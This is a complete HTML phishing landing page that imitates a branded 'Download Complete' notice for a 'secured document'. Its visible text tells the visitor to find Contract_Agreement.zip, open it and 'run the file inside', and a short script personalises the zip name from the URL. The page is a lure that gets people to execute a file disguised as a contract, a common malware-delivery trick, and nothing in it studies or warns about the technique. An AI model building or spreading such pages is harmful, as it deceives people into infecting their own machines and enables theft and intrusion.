<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download Complete</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; background-color: #f9f9f9; }
        .card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 500px; }
        .logo { width: 80px; margin-bottom: 20px; }
        h1 { font-size: 28px; color: #333; margin-bottom: 10px; }
        p { font-size: 16px; color: #666; line-height: 1.5; margin-bottom: 20px; }
        .filename { font-weight: bold; color: #333; }
        .btn { background-color: #ed2224; color: white; padding: 12px 24px; text-decoration: none; border-radius: 4px; font-weight: bold; display: inline-block; margin-top: 10px; }
        .btn:hover { background-color: #c41b1d; }
    </style>
</head>
<body>
    <div class="card">
        <svg class="logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
            <rect x="0" y="0" width="100" height="100" rx="22" fill="#ed2224"/>
            <polygon points="24,80 44,24 53,49 44,80" fill="#fff"/>
            <polygon points="58,80 76,24 76,80 67,80" fill="#fff"/>
        </svg>
        
        <h1>Download Complete</h1>
        <p>You've received a secured document.</p>
        <p>Your Document has been saved to your device. Find <span id="zipName" class="filename">Contract_Agreement.zip</span> in Recent (File Explorer), open it, and run the file inside to view your document.</p>
        
        <a href="#" class="btn" onclick="window.location.reload()">Download Document Again</a>
    </div>

    <script>
        // Get the unique filename from the URL
        const urlParams = new URLSearchParams(window.location.search);
        const uniqueZip = urlParams.get('zip') || 'Contract_Agreement.zip';
        document.getElementById('zipName').innerText = uniqueZip;
    </script>
</body>
</html>
